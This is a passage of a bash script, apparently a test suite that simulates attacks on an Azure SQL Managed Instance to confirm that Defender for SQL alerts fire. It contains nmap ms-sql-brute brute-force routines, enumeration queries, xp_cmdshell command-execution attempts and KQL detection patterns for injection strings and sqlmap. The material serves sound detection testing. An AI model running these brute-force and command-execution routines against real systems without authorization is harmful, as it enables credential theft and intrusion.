            --script ms-sql-info,ms-sql-config,ms-sql-dump-hashes,ms-sql-hasdbaccess \
            "$host" 2>&1 || true
        
        if command -v sqlcmd &> /dev/null && [[ -n "$username" && -n "$password" ]]; then
            echo ""
            echo "=== Authenticated Enumeration ==="
            print_status "Gathering system information with valid credentials..."
            
            # System information gathering
            local enum_queries=(
                "SELECT @@VERSION"
                "SELECT SERVERPROPERTY('ProductVersion')"
                "SELECT SERVERPROPERTY('Edition')"
                "SELECT name FROM sys.databases"
                "SELECT name FROM sys.server_principals WHERE type = 'S'"
                "SELECT * FROM sys.dm_os_sys_info"
                "SELECT * FROM sys.configurations WHERE value_in_use <> 0"
            )
            
            for query in "${enum_queries[@]}"; do
                echo "Executing: $query"
                timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                    -Q "$query" 2>&1 || true
                sleep 2
            done
        fi
        
    } | tee "$result_file"
    
    print_success "Database enumeration test completed: $result_file"
    return 0
}

# Function to test shell command execution attempts
test_shell_commands() {
    local host="$1"
    local port="$2"
    local username="$3"
    local password="$4"
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/shell_commands_test_${timestamp}.txt"
    
    print_test "Shell Commands: Testing command execution detection (limited on SQL MI)"
    
    {
        echo "=== Shell Command Execution Test Report ==="
        echo "Date: $(date)"
        echo "Target: $host:$port"
        echo "Test: Command execution attempts"
        echo "Expected Alert: SQL.MI_ShellExternalSourceAnomaly (limited on MI)"
        echo "Session: $CURRENT_SESSION"
        echo "Note: Azure SQL MI has limited command execution capabilities"
        echo "==============================="
        echo ""
        
        if command -v sqlcmd &> /dev/null && [[ -n "$username" && -n "$password" ]]; then
            print_status "Testing command execution attempts..."
            
            # Test various command execution attempts (most will fail on SQL MI)
            local cmd_tests=(
                "EXEC xp_cmdshell 'dir'"
                "EXEC xp_cmdshell 'whoami'"
                "EXEC xp_cmdshell 'ipconfig'"
                "EXEC sp_configure 'show advanced options', 1"
                "EXEC sp_configure 'xp_cmdshell', 1"
                "EXEC xp_dirtree 'C:\'"
                "EXEC xp_fileexist 'C:\Windows\system32\cmd.exe'"
            )
            
            for cmd in "${cmd_tests[@]}"; do
                echo "Testing: $cmd"
                timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                    -Q "$cmd" 2>&1 || true
                sleep 2
            done
            
            # Test SQL Server Agent job creation (also limited on MI)
            echo ""
            echo "Testing SQL Server Agent job manipulation..."
            timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                -Q "SELECT name FROM msdb.dbo.sysjobs" 2>&1 || true
                
        else
            print_warning "No credentials provided - skipping command execution tests"
        fi
        
    } | tee "$result_file"
    
    print_success "Shell command test completed: $result_file"
    return 0
}

# Function to generate comprehensive test report
generate_test_report() {
    local host="$1"
    local tests_run="$2"
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local report_file="$RESULTS_DIR/defender_sql_test_report_${timestamp}.md"
    
    cat > "$report_file" << EOF
# Defender for SQL - Comprehensive Security Test Report

## Test Overview
- **Target**: $host
- **Test Date**: $(date)
- **Tests Executed**: $tests_run
- **Purpose**: Validate Defender for SQL detection capabilities for Azure SQL Managed Instance

## Expected Alerts

Based on the tests performed, the following Defender for SQL alerts should be generated:

### High Severity
- **SQL.MI_BruteForce**: Brute force attack detection
- **SQL.MI_PotentialSqlInjection**: Active SQL injection attempts
- **SQL.MI_HarmfulApplication**: Access from potentially harmful applications
- **SQL.MI_ShellExternalSourceAnomaly**: Shell command execution attempts

### Medium Severity
- **SQL.MI_VulnerabilityToSqlInjection**: SQL injection vulnerability detection
- **SQL.MI_SuspiciousIpAnomaly**: Access from suspicious IP addresses
- **SQL.MI_PrincipalAnomaly**: Unusual user access patterns
- **SQL.MI_DomainAnomaly**: Access from unusual domains
- **SQL.MI_GeoAnomaly**: Access from unusual geographical locations

### Low Severity
- **SQL.MI_DataCenterAnomaly**: Access from unusual Azure data centers

## Test Results Summary

### Tests Performed
1. **Brute Force Testing**: Multiple failed login attempts to trigger authentication alerts
2. **SQL Injection Testing**: Malicious SQL payloads to test injection detection
3. **Harmful Application Testing**: Connections from suspicious application signatures
4. **Suspicious Query Testing**: Execution of reconnaissance and enumeration queries
5. **Database Enumeration**: Information gathering attempts
6. **Shell Command Testing**: Attempts to execute system commands (limited on SQL MI)

### Files Generated
- **Results**: \`$RESULTS_DIR/\`
- **Logs**: \`$LOG_DIR/\`

## Validation Steps

1. **Azure Security Center**: Check for new alerts in the security dashboard
2. **Log Analytics Workspace**: Query for security events and failed login attempts
3. **SQL MI Audit Logs**: Review authentication and query execution logs
4. **Defender for SQL Recommendations**: Check for new security recommendations

## Sample Queries for Log Analytics

\`\`\`kusto
// Failed login attempts
AzureDiagnostics
| where Category == "SQLSecurityAuditEvents"
| where action_name_s == "FAILED_LOGIN"
| where TimeGenerated > ago(1h)
| summarize count() by client_ip_s, server_principal_name_s

// SQL injection attempts
AzureDiagnostics
| where Category == "SQLSecurityAuditEvents"
| where statement_s contains "OR 1=1" or statement_s contains "UNION SELECT"
| where TimeGenerated > ago(1h)

// Suspicious application connections
AzureDiagnostics
| where Category == "SQLSecurityAuditEvents"
| where application_name_s contains "sqlmap" or application_name_s contains "havij"
| where TimeGenerated > ago(1h)
\`\`\`

## Remediation Recommendations

1. **Authentication Security**:
   - Implement Azure AD authentication
   - Enable multi-factor authentication
   - Use strong password policies

2. **Network Security**:
   - Restrict access using firewall rules
   - Use private endpoints where possible
   - Implement network security groups

3. **Monitoring and Alerting**:
   - Set up automated response to security alerts
   - Configure alert notifications
   - Implement security dashboards

4. **Application Security**:
   - Use parameterized queries to prevent SQL injection
   - Implement input validation
   - Regular security code reviews

## Next Steps

1. Verify that alerts were generated in Azure Security Center
2. Review the detected threats and their classifications
3. Test incident response procedures
4. Update security policies based on findings
5. Schedule regular security testing

---

**Report Generated**: $(date)  
**Test Scripts**: Defender for SQL Comprehensive Testing Suite  
**Purpose**: Security validation and alert verification
EOF

    print_success "Comprehensive test report generated: $report_file"
}

# Function to generate comprehensive test report
generate_comprehensive_report() {
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local report_file="$REPORT_DIR/comprehensive_test_report_${timestamp}.html"
    local json_report="$REPORT_DIR/comprehensive_test_report_${timestamp}.json"
    
    print_status "Generating comprehensive test report..."
    
    # Create HTML report
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Defender for SQL Testing Report - $CURRENT_SESSION</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #0078d4; color: white; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #0078d4; background-color: #f8f9fa; }
        .test-result { margin: 10px 0; padding: 10px; border-radius: 3px; }
        .success { background-color: #d4edda; border-color: #28a745; }
        .warning { background-color: #fff3cd; border-color: #ffc107; }
        .error { background-color: #f8d7da; border-color: #dc3545; }
        .info { background-color: #d1ecf1; border-color: #17a2b8; }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .code { background-color: #f4f4f4; padding: 10px; border-radius: 3px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Defender for SQL Testing Report</h1>
        <p><strong>Session:</strong> $CURRENT_SESSION</p>
        <p><strong>Target:</strong> $HOST:$PORT</p>
        <p><strong>Generated:</strong> $(date)</p>
    </div>

    <div class="section">
        <h2>Executive Summary</h2>
        <p>This report summarizes the comprehensive security testing performed against the Azure SQL Managed Instance to validate Defender for SQL alert generation and security monitoring capabilities.</p>
    </div>

    <div class="section">
        <h2>Test Results Summary</h2>
        <table>
            <tr><th>Test Category</th><th>Status</th><th>Expected Alerts</th><th>Details</th></tr>
EOF

    # Analyze results files
    local test_categories=("password_bruteforce" "username_bruteforce" "comprehensive_bruteforce" "sql_injection" "harmful_application" "suspicious_queries" "enumeration" "shell_commands")
    local total_tests=0
    local completed_tests=0
    
    for category in "${test_categories[@]}"; do
        local latest_file
        latest_file=$(find "$RESULTS_DIR" -name "${category}_*.txt" -type f -exec ls -t {} + 2>/dev/null | head -1)
        total_tests=$((total_tests + 1))
        
        if [[ -f "$latest_file" ]]; then
            completed_tests=$((completed_tests + 1))
            local status="✅ Completed"
            local status_class="success"
            
            # Determine expected alerts based on test type
            local expected_alerts=""
            case "$category" in
                "password_bruteforce"|"username_bruteforce"|"comprehensive_bruteforce")
                    expected_alerts="SQL.MI_BruteForce, SQL.MI_PrincipalAnomaly"
                    ;;
                "sql_injection")
                    expected_alerts="SQL.MI_VulnerabilityToSqlInjection, SQL.MI_PotentialSqlInjection"
                    ;;
                "harmful_application")
                    expected_alerts="SQL.MI_HarmfulApplication"
                    ;;
                "suspicious_queries"|"enumeration")
                    expected_alerts="Various anomaly detection alerts"
                    ;;
                "shell_commands")
                    expected_alerts="SQL.MI_ShellExternalSourceAnomaly (limited)"
                    ;;
            esac
            
            echo "            <tr class=\"$status_class\"><td>$category</td><td>$status</td><td>$expected_alerts</td><td><a href=\"file://$latest_file\">View Details</a></td></tr>" >> "$report_file"
        else
            echo "            <tr class=\"error\"><td>$category</td><td>❌ Not Run</td><td>N/A</td><td>Test not executed</td></tr>" >> "$report_file"
        fi
    done

    cat >> "$report_file" << EOF
        </table>
        <p><strong>Completion Rate:</strong> $completed_tests/$total_tests tests completed</p>
    </div>

    <div class="section">
        <h2>Expected Defender Alerts</h2>
        <p>The following alerts should appear in Azure Security Center within 5-15 minutes:</p>
        <ul>
            <li><strong>SQL.MI_BruteForce:</strong> Multiple failed login attempts detected</li>
            <li><strong>SQL.MI_PrincipalAnomaly:</strong> Unusual user access patterns</li>
            <li><strong>SQL.MI_VulnerabilityToSqlInjection:</strong> Potential SQL injection vulnerability</li>
            <li><strong>SQL.MI_PotentialSqlInjection:</strong> Active SQL injection attempts</li>
            <li><strong>SQL.MI_HarmfulApplication:</strong> Connection from potentially harmful application</li>
            <li><strong>SQL.MI_SuspiciousIpAnomaly:</strong> Access from suspicious IP address</li>
        </ul>
    </div>

    <div class="section">
        <h2>Monitoring Instructions</h2>
        <ol>
            <li>Navigate to Azure Security Center in the Azure Portal</li>
            <li>Go to <strong>Security Alerts</strong> section</li>
            <li>Filter by <strong>Resource Type: SQL</strong></li>
            <li>Look for alerts with timestamps matching this test session</li>
            <li>Review alert details and remediation recommendations</li>
        </ol>
    </div>

    <div class="section">
        <h2>Test Files Generated</h2>
        <ul>
EOF

    # List all generated files
    for file in "$LOG_DIR"/*"${CURRENT_SESSION}"* "$RESULTS_DIR"/*"$(date +"%Y%m%d")"*; do
        if [[ -f "$file" ]]; then
            echo "            <li><a href=\"file://$file\">$(basename "$file")</a></li>" >> "$report_file"
        fi
    done

    cat >> "$report_file" << EOF
        </ul>
    </div>

    <div class="section">
        <h2>Next Steps</h2>
        <ul>
            <li>Monitor Azure Security Center for alert generation</li>
            <li>Review individual test result files for detailed analysis</li>
            <li>Validate that security monitoring systems detected the test activities</li>
            <li>Document any gaps in alert coverage for security team review</li>
        </ul>
    </div>

    <footer style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; font-size: 12px;">
        <p>Generated by Defender for SQL Testing Suite - $(date)</p>
    </footer>
</body>
</html>
EOF

    # Create JSON report for programmatic processing
    if command -v jq &> /dev/null; then
        cat > "$json_report" << EOF
{
    "session": "$CURRENT_SESSION",
    "target": {
        "host": "$HOST",
        "port": "$PORT",
        "username": "$USERNAME"
    },
    "timestamp": "$(date -Iseconds)",
    "summary": {
        "total_tests": $total_tests,
        "completed_tests": $completed_tests,
        "completion_rate": $(echo "scale=2; $completed_tests * 100 / $total_tests" | bc 2>/dev/null || echo "0")
    },
    "test_results": [
EOF

        local first=true
        for category in "${test_categories[@]}"; do
            local latest_file
            latest_file=$(find "$RESULTS_DIR" -name "${category}_*.txt" -type f -exec ls -t {} + 2>/dev/null | head -1)
            
            if [[ "$first" == "false" ]]; then
                echo "," >> "$json_report"
            fi
            first=false
            
            if [[ -f "$latest_file" ]]; then
                echo "        {\"category\": \"$category\", \"status\": \"completed\", \"file\": \"$latest_file\"}" >> "$json_report"
            else
                echo "        {\"category\": \"$category\", \"status\": \"not_run\", \"file\": null}" >> "$json_report"
            fi
        done

        cat >> "$json_report" << EOF
    ]
}
EOF
    fi

    print_success "Comprehensive report generated:"
    print_status "HTML Report: $report_file"
    if [[ -f "$json_report" ]]; then
        print_status "JSON Report: $json_report"
    fi
    
    # Offer to open the report
    if command -v open &> /dev/null; then  # macOS
        echo -n "Open HTML report now? (y/n): "
        read -r response
        if [[ "$response" =~ ^[Yy] ]]; then
            open "$report_file"
        fi
    fi
    
    return 0
}

# Function to show main menu
show_main_menu() {
    show_banner
    echo -e "${BOLD}Main Menu${NC}"
    echo "════════════════════════════════════════════════════════════════════════════════════"
    echo
    print_menu_option "1." "Configure Target (Host/Port/Credentials)"
    print_menu_option "2." "Password Brute Force Testing"
    print_menu_option "3." "Username Enumeration Testing"  
    print_menu_option "4." "Comprehensive Brute Force (Password + Username)"
    print_menu_option "5." "SQL Injection Testing"
    print_menu_option "6." "Harmful Application Detection"
    print_menu_option "7." "Suspicious Query Patterns"
    print_menu_option "8." "Database Enumeration"
    print_menu_option "9." "Shell Command Execution Tests"
    print_menu_option "10." "Run All Tests (Comprehensive Suite)"
    print_menu_option "11." "View Test Reports"
    print_menu_option "12." "Generate Summary Report"
    echo
    print_menu_option "q." "Quit"
    echo
    echo "════════════════════════════════════════════════════════════════════════════════════"
}

# Function to configure target
configure_target() {
    show_banner
    echo -e "${BOLD}Target Configuration${NC}"
    echo "════════════════════════════════════════════════════════════════════════════════════"
    echo
    
    # Host configuration
    echo "Select hostname configuration method:"
    echo "  1. Manual entry"
    echo "  2. Auto-discover from Azure (default RG: rg-d4sql-sims)"
    echo "  3. Auto-discover from custom Azure Resource Group"
    echo
    echo -n "Choose option (1-3): "
    read -r host_option
    
    case "$host_option" in
        1)
            echo -n "Enter SQL MI hostname/FQDN"
            if [[ -n "$HOST" ]]; then
                echo -n " (current: $HOST)"
            fi
            echo -n ": "
            read -r new_host
            if [[ -n "$new_host" ]]; then
                HOST="$new_host"
            fi
            ;;
        2)
            print_status "Auto-discovering SQL MI from default resource group..."
            if auto_discover_sql_mi "rg-d4sql-sims"; then
                HOST="$HOSTNAME"
            else
                print_error "Auto-discovery failed. Please try manual entry."
                print_status "Press Enter to continue..."
                read -r
                return 1
            fi
            ;;
        3)
            echo -n "Enter Azure Resource Group name: "
            read -r resource_group
            if [[ -n "$resource_group" ]]; then
                print_status "Auto-discovering SQL MI from resource group: $resource_group"
                if auto_discover_sql_mi "$resource_group"; then
                    HOST="$HOSTNAME"
                else
                    print_error "Auto-discovery failed. Please try manual entry."
                    print_status "Press Enter to continue..."
                    read -r
                    return 1
                fi
            else
                print_error "Resource group name is required."
                print_status "Press Enter to continue..."
                read -r
                return 1
            fi
            ;;
        *)
            print_error "Invalid option. Using manual entry."
            echo -n "Enter SQL MI hostname/FQDN"
            if [[ -n "$HOST" ]]; then
                echo -n " (current: $HOST)"
            fi
            echo -n ": "
            read -r new_host
            if [[ -n "$new_host" ]]; then
                HOST="$new_host"
            fi
            ;;
    esac
    
    # Port configuration
    echo -n "Enter port (current: $PORT): "
    read -r new_port
    if [[ -n "$new_port" ]]; then
        PORT="$new_port"
    fi
    
    # Username configuration
    echo -n "Enter username (current: $USERNAME): "
    read -r new_username
    if [[ -n "$new_username" ]]; then
        USERNAME="$new_username"
    fi
    
    # Password configuration
    echo -n "Enter password (leave blank to skip authenticated tests): "
    read -rs new_password
    echo
    if [[ -n "$new_password" ]]; then
        PASSWORD="$new_password"
    fi
    
    # Create session identifier
    CURRENT_SESSION="$(date +"%Y%m%d_%H%M%S")_${HOST##*.}"
    
    print_success "Target configured successfully!"
    print_status "Press Enter to continue..."
    read -r
}

# Function to validate target configuration
validate_target() {
    if [[ -z "$HOST" ]]; then
        print_error "No target host configured. Please configure target first."
        print_status "Press Enter to continue..."
        read -r
        return 1
    fi
    return 0
}

# Function to show test menu for brute force options
show_brute_force_menu() {
    show_banner
    echo -e "${BOLD}Brute Force Testing Options${NC}"
    echo "════════════════════════════════════════════════════════════════════════════════════"
    echo
    print_menu_option "1." "Quick Test (Small wordlists, fast)"
    print_menu_option "2." "Standard Test (Medium wordlists, balanced)"
    print_menu_option "3." "Comprehensive Test (Large wordlists, thorough)"
    print_menu_option "4." "Stealth Test (Slow rate, realistic timing)"
    print_menu_option "5." "Custom Configuration"
    echo
    print_menu_option "b." "Back to Main Menu"
    echo
    echo "════════════════════════════════════════════════════════════════════════════════════"
}

# Function to get test configuration based on selection
get_test_config() {
    local test_type="$1"
    local threads delay wordlist
    
    case "$test_type" in
        "1"|"quick")
            threads="12"
            delay="1"
            wordlist="small"
            ;;
        "2"|"standard")
            threads="8"
            delay="2"
            wordlist="medium"
            ;;
        "3"|"comprehensive")
            threads="6"
            delay="2"
            wordlist="large"
            ;;
        "4"|"stealth")
            threads="4"
            delay="5"
            wordlist="medium"
            ;;
        "5"|"custom")
            echo -n "Enter number of threads (default: 8): "
            read -r threads
            threads="${threads:-8}"
            
            echo -n "Enter delay between attempts in seconds (default: 2): "
            read -r delay
            delay="${delay:-2}"
            
            echo -n "Enter wordlist size (small/medium/large, default: medium): "
            read -r wordlist
            wordlist="${wordlist:-medium}"
            ;;
        *)
            threads="8"
            delay="2"
            wordlist="medium"
            ;;
    esac
    
    echo "$threads $delay $wordlist"
}

# Function to perform password brute force attack
run_password_brute_force() {
    local host="$1"
    local port="$2"
    local username="$3"
    local threads="$4"
    local delay="$5"
    local wordlist_type="$6"
    local verbose="$7"
    
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local log_file="$LOG_DIR/password_bruteforce_${timestamp}.log"
    local results_file="$RESULTS_DIR/password_bruteforce_results_${timestamp}.txt"
    local wordlist_file="$WORDLIST_DIR/passwords_${wordlist_type}.txt"
    
    print_test "Password Brute Force: Testing password attacks on username '$username'"
    print_status "Target: $host:$port"
    print_status "Wordlist: $wordlist_type ($wordlist_file)"
    print_status "Threads: $threads, Delay: ${delay}s"
    
    if [[ ! -f "$wordlist_file" ]]; then
        print_error "Wordlist file not found: $wordlist_file"
        return 1
    fi
    
    local password_count
    password_count=$(wc -l < "$wordlist_file")
    print_status "Testing $password_count passwords..."
    
    {
        echo "=== Password Brute Force Attack Report ==="
        echo "Date: $(date)"
        echo "Target: $host:$port"
        echo "Username: $username"
        echo "Wordlist: $wordlist_type ($password_count passwords)"
        echo "Threads: $threads"
        echo "Delay: ${delay}s"
        echo "Session: $CURRENT_SESSION"
        echo ""
        echo "=== Attack Details ==="
        
        # Create temporary file with single username
        local temp_userfile
        temp_userfile=$(mktemp)
        echo "$username" > "$temp_userfile"
        
        # Build nmap command
        local nmap_cmd="nmap -p $port --script ms-sql-brute"
        nmap_cmd+=" --script-args userdb='$temp_userfile',passdb='$wordlist_file'"
        nmap_cmd+=" --script-args ms-sql-brute.threads=$threads"
        
        if [[ "$delay" != "0" && "$delay" != "1" ]]; then
            nmap_cmd+=" --script-args ms-sql-brute.delay=${delay}s"
        fi
        
        if [[ "$verbose" == "true" ]]; then
            nmap_cmd+=" -v"
        fi
        
        nmap_cmd+=" $host"
        
        echo "Command: $nmap_cmd"
        echo ""
        echo "=== Nmap Output ==="
        
        # Execute the attack
        timeout 3600 bash -c "$nmap_cmd" 2>&1 || {
            local exit_code=$?
            if [[ $exit_code == 124 ]]; then
                echo "Attack timed out after 1 hour"
            else
                echo "Attack completed with exit code: $exit_code"
            fi
        }
        
        # Cleanup
        rm -f "$temp_userfile"
        
        echo ""
        echo "=== Attack Summary ==="
        echo "End time: $(date)"
        echo "Expected Alert: SQL.MI_BruteForce"
        echo "Monitor: Azure Security Center > Security Alerts"
        
    } | tee "$log_file" > "$results_file"
    
    print_success "Password brute force completed: $results_file"
    
    # Check for successful logins
    if grep -q "Valid credentials" "$results_file"; then
        print_warning "⚠️  SECURITY ALERT: Valid credentials found! Check results immediately."
        grep "Valid credentials" "$results_file" | head -3
    else
        print_success "✅ No valid credentials found (expected for security test)"
    fi
    
    return 0
}

# Function to perform username enumeration brute force attack
run_username_brute_force() {
    local host="$1"
    local port="$2"
    local threads="$3"
    local delay="$4"
    local username_wordlist_type="$5"
    local password_wordlist_type="$6"
    local verbose="$7"
    
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local log_file="$LOG_DIR/username_bruteforce_${timestamp}.log"
    local results_file="$RESULTS_DIR/username_bruteforce_results_${timestamp}.txt"
    local username_wordlist_file="$WORDLIST_DIR/usernames_${username_wordlist_type}.txt"
    local password_wordlist_file="$WORDLIST_DIR/enum_passwords_${password_wordlist_type}.txt"
    
    print_test "Username Enumeration: Testing common SQL Server usernames"
    print_status "Target: $host:$port"
    print_status "Username wordlist: $username_wordlist_type"
    print_status "Password wordlist: $password_wordlist_type"
    print_status "Threads: $threads, Delay: ${delay}s"
    
    if [[ ! -f "$username_wordlist_file" ]]; then
        print_error "Username wordlist file not found: $username_wordlist_file"
        return 1
    fi
    
    if [[ ! -f "$password_wordlist_file" ]]; then
        print_error "Password wordlist file not found: $password_wordlist_file"
        return 1
    fi
    
    local username_count
    local password_count
    username_count=$(wc -l < "$username_wordlist_file")
    password_count=$(wc -l < "$password_wordlist_file")
    local total_combinations=$((username_count * password_count))
    
    print_status "Testing $username_count usernames with $password_count passwords ($total_combinations combinations)..."
    
    {
        echo "=== Username Enumeration Brute Force Report ==="
        echo "Date: $(date)"
        echo "Target: $host:$port"
        echo "Username wordlist: $username_wordlist_type ($username_count usernames)"
        echo "Password wordlist: $password_wordlist_type ($password_count passwords)"
        echo "Total combinations: $total_combinations"
        echo "Threads: $threads"
        echo "Delay: ${delay}s"
        echo "Session: $CURRENT_SESSION"
        echo ""
        echo "=== Attack Details ==="
        
        # Build nmap command
        local nmap_cmd="nmap -p $port --script ms-sql-brute"
        nmap_cmd+=" --script-args userdb='$username_wordlist_file',passdb='$password_wordlist_file'"
        nmap_cmd+=" --script-args ms-sql-brute.threads=$threads"
        
        if [[ "$delay" != "0" && "$delay" != "1" ]]; then
            nmap_cmd+=" --script-args ms-sql-brute.delay=${delay}s"
        fi
        
        if [[ "$verbose" == "true" ]]; then
            nmap_cmd+=" -v"
        fi
        
        nmap_cmd+=" $host"
        
        echo "Command: $nmap_cmd"
        echo ""
        echo "=== Nmap Output ==="
        
        # Execute the attack
        timeout 7200 bash -c "$nmap_cmd" 2>&1 || {
            local exit_code=$?
            if [[ $exit_code == 124 ]]; then
                echo "Attack timed out after 2 hours"
            else
                echo "Attack completed with exit code: $exit_code"
            fi
        }
        
        echo ""
        echo "=== Attack Summary ==="
        echo "End time: $(date)"
        echo "Expected Alerts: SQL.MI_BruteForce, SQL.MI_PrincipalAnomaly"
        echo "Monitor: Azure Security Center > Security Alerts"
        
    } | tee "$log_file" > "$results_file"
    
    print_success "Username enumeration completed: $results_file"
    
    # Check for successful logins
    if grep -q "Valid credentials" "$results_file"; then
        print_warning "⚠️  SECURITY ALERT: Valid credentials found! Check results immediately."
        grep "Valid credentials" "$results_file" | head -5
    else
        print_success "✅ No valid credentials found (expected for security test)"
    fi
    
    return 0
}

# Function to run comprehensive brute force (both password and username tests)
run_comprehensive_brute_force() {
    local host="$1"
    local port="$2"
    local username="$3"
    local threads="$4"
    local delay="$5"
    local wordlist_type="$6"
    local verbose="$7"
    
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local results_file="$RESULTS_DIR/comprehensive_bruteforce_results_${timestamp}.txt"
    
    print_test "Comprehensive Brute Force: Password + Username enumeration attacks"
    
    {
        echo "=== Comprehensive Brute Force Test Report ==="
        echo "Date: $(date)"
        echo "Target: $host:$port"
        echo "Session: $CURRENT_SESSION"
        echo "Configuration: $wordlist_type wordlists, $threads threads, ${delay}s delay"
        echo ""
        echo "This test combines both password and username enumeration attacks"
        echo "to provide comprehensive brute force testing coverage."
        echo ""
        
    } > "$results_file"
    
    print_status "Phase 1: Password brute force on known username..."
    if run_password_brute_force "$host" "$port" "$username" "$threads" "$delay" "$wordlist_type" "$verbose"; then
        echo "✅ Phase 1 (Password Brute Force): COMPLETED" >> "$results_file"
    else
        echo "❌ Phase 1 (Password Brute Force): FAILED" >> "$results_file"
        print_error "Password brute force failed"
        return 1
    fi
    
    print_status "Waiting 30 seconds before username enumeration..."
    sleep 30
    
    print_status "Phase 2: Username enumeration with common passwords..."
    if run_username_brute_force "$host" "$port" "$threads" "$delay" "$wordlist_type" "small" "$verbose"; then
        echo "✅ Phase 2 (Username Enumeration): COMPLETED" >> "$results_file"
    else
        echo "❌ Phase 2 (Username Enumeration): FAILED" >> "$results_file"
        print_error "Username enumeration failed"
        return 1
    fi
    
    {
        echo ""
        echo "=== Comprehensive Test Summary ==="
        echo "Both password and username brute force tests completed"
        echo "Expected Alerts: SQL.MI_BruteForce, SQL.MI_PrincipalAnomaly"
        echo "Monitor Azure Security Center for alert generation"
        echo "End time: $(date)"
    } >> "$results_file"
    
    print_success "Comprehensive brute force completed: $results_file"
    return 0
}

# Function to handle menu selection and execute tests
handle_menu_selection() {
    local choice="$1"
    
    case "$choice" in
        "1")
            configure_target
            ;;
        "2")
            if ! validate_target; then return; fi
            show_brute_force_menu
            echo -n "Select test configuration: "
            read -r test_config
            if [[ "$test_config" == "b" ]]; then return; fi
            
            local config
            IFS=' ' read -ra config <<< "$(get_test_config "$test_config")"
            local threads="${config[0]}"
            local delay="${config[1]}"
            local wordlist="${config[2]}"
            
            print_status "Starting password brute force test..."
            run_password_brute_force "$HOST" "$PORT" "$USERNAME" "$threads" "$delay" "$wordlist" "$VERBOSE"
            print_status "Press Enter to continue..."
            read -r
            ;;
        "3")
            if ! validate_target; then return; fi
            show_brute_force_menu
            echo -n "Select test configuration: "
            read -r test_config
            if [[ "$test_config" == "b" ]]; then return; fi
            
            local config
            IFS=' ' read -ra config <<< "$(get_test_config "$test_config")"
            local threads="${config[0]}"
            local delay="${config[1]}"
            local wordlist="${config[2]}"
            
            print_status "Starting username enumeration test..."
            run_username_brute_force "$HOST" "$PORT" "$threads" "$delay" "$wordlist" "small" "$VERBOSE"
            print_status "Press Enter to continue..."
            read -r
            ;;
        "4")
            if ! validate_target; then return; fi
            show_brute_force_menu
            echo -n "Select test configuration: "
            read -r test_config
            if [[ "$test_config" == "b" ]]; then return; fi
            
            local config
            IFS=' ' read -ra config <<< "$(get_test_config "$test_config")"
            local threads="${config[0]}"
            local delay="${config[1]}"
            local wordlist="${config[2]}"
            
            print_status "Starting comprehensive brute force test..."
            run_comprehensive_brute_force "$HOST" "$PORT" "$USERNAME" "$threads" "$delay" "$wordlist" "$VERBOSE"
            print_status "Press Enter to continue..."
            read -r
            ;;
        "5")
            if ! validate_target; then return; fi
            print_status "Starting SQL injection test..."
            test_sql_injection "$HOST" "$PORT" "$USERNAME" "$PASSWORD"
            print_status "Press Enter to continue..."
            read -r
            ;;
        "6")
            if ! validate_target; then return; fi
            print_status "Starting harmful application test..."
            test_harmful_application "$HOST" "$PORT"
            print_status "Press Enter to continue..."
            read -r
            ;;
        "7")
            if ! validate_target; then return; fi
            print_status "Starting suspicious queries test..."
            test_suspicious_queries "$HOST" "$PORT" "$USERNAME" "$PASSWORD"
            print_status "Press Enter to continue..."
            read -r
            ;;
        "8")
            if ! validate_target; then return; fi
            print_status "Starting database enumeration test..."
            test_enumeration "$HOST" "$PORT" "$USERNAME" "$PASSWORD"
            print_status "Press Enter to continue..."
            read -r
            ;;
        "9")
            if ! validate_target; then return; fi
            print_status "Starting shell command execution test..."
            test_shell_commands "$HOST" "$PORT" "$USERNAME" "$PASSWORD"
            print_status "Press Enter to continue..."
            read -r
            ;;
        "10")
            if ! validate_target; then return; fi
            print_warning "⚠️  This will run ALL security tests. This may take 1-3 hours."
            echo -n "Continue? (y/n): "
            read -r confirm
            if [[ "$confirm" =~ ^[Yy] ]]; then
                run_all_tests
            fi
            print_status "Press Enter to continue..."
            read -r
            ;;
        "11")
            view_test_reports
            ;;
        "12")
            generate_comprehensive_report
            print_status "Press Enter to continue..."
            read -r
            ;;
        "q"|"Q")
            print_success "Exiting Defender for SQL Testing Suite"
            exit 0
            ;;
        *)
            print_error "Invalid option. Please try again."
            sleep 2
            ;;
    esac
}

# Function to run all tests in sequence
run_all_tests() {
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local all_tests_log="$LOG_DIR/all_tests_${timestamp}.log"
    
    print_status "Starting comprehensive test suite..."
    
    {
        echo "=== Comprehensive Test Suite Execution ==="
        echo "Date: $(date)"
        echo "Target: $HOST:$PORT"
        echo "Session: $CURRENT_SESSION"
        echo "=========================================="
        echo ""
        
        # Run tests in logical order
        local tests=(
            "Password Brute Force:run_password_brute_force:$HOST:$PORT:$USERNAME:8:2:medium:$VERBOSE"
            "Username Enumeration:run_username_brute_force:$HOST:$PORT:8:2:medium:small:$VERBOSE"
            "SQL Injection:test_sql_injection:$HOST:$PORT:$USERNAME:$PASSWORD"
            "Harmful Application:test_harmful_application:$HOST:$PORT"
            "Suspicious Queries:test_suspicious_queries:$HOST:$PORT:$USERNAME:$PASSWORD"
            "Database Enumeration:test_enumeration:$HOST:$PORT:$USERNAME:$PASSWORD"
            "Shell Commands:test_shell_commands:$HOST:$PORT:$USERNAME:$PASSWORD"
        )
        
        local test_num=1
        local total_tests=${#tests[@]}
        
        for test_info in "${tests[@]}"; do
            IFS=':' read -ra test_parts <<< "$test_info"
            local test_name="${test_parts[0]}"
            local test_function="${test_parts[1]}"
